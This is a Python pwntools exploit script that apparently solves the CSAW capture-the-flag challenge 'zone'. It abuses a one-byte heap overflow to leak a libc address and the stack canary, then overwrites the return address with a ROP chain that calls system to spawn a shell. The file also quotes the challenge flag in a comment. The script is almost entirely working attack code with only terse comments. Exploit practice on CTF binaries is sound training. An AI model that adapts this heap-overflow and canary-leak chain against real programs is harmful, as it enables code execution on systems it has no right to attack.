from pwn import *

#p = remote("pwn.chal.csaw.io", 5223)
p = process("./zone")
# flag{d0n7_let_m3_g3t_1n_my_z0n3}
#raw_input()

def menu():
	p.recvuntil("5) Exit\n")

def allocate(size):
	menu()
	p.sendline("1")
	p.sendline(str(size))

def delete():
	menu()
	p.sendline("2")

def edit(name):
	menu()
	p.sendline("3")
	p.sendline(name)

p.recvuntil("Environment setup: ")
stack_leak = int(p.recv(14),16)

buf = "A"*64
buf += "\x80"
allocate(64)

edit(buf)
# Overflowed 1 byte.
allocate(64)
delete()

allocate(110)
buf = "A"*72
edit(buf)

# Leak libc.
menu()
p.sendline("4")
p.recvuntil(buf)
libc = p.recv(6)
libc += "\x00"*2
libc = u64(libc) - 0xb840f0
log.info("Libc: " + hex(libc))
log.info("Stack: " + hex(stack_leak))

stack = p64(stack_leak + 0x30)
#hook = p64(libc + 0x3c4af5)
#magic = p64(libc + 0xf0274)
system = p64(libc + 0x45390)

buf = "A"*64
buf += p64(0x80)
buf += stack
edit(buf)

allocate(64)
#p.interactive()
delete()

allocate(64)
# Chunk allocated near saved rbp. Leak canary.
finale = "Z"*41
edit(finale)

menu()
p.sendline("4")
p.recvuntil(finale)
canary = p.recv(7)
canary = "\x00" + canary
canary = u64(canary)
log.info("Canary: " + hex(canary))

delete()
allocate(250)

finale = "X"*40
finale += p64(canary)
finale += "D"*24
finale += p64(0x0000000000404653)
finale += p64(libc + 0x11e70)
finale += system
edit(finale)

p.interactive()
